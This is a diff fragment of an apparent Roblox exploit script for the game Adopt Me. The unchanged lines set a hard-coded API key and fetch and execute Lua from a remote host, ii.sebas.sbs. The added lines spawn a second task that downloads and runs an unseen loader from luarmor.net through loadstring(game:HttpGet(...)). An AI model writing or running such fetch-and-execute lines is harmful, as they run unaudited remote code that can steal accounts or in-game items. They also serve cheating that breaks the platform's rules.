@@ -6,6 +6,11 @@ task.spawn(function()
     getgenv().API_KEY = "RukIIrukYPFoGnQUcD7c"
     loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
 end)
+wait(1)
+task.spawn(function()
+    task.wait(1)
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/08615e5f6a25239a4ffa9b6203728d70.lua"))()
+end)
 
 wait(1)
 local args = {
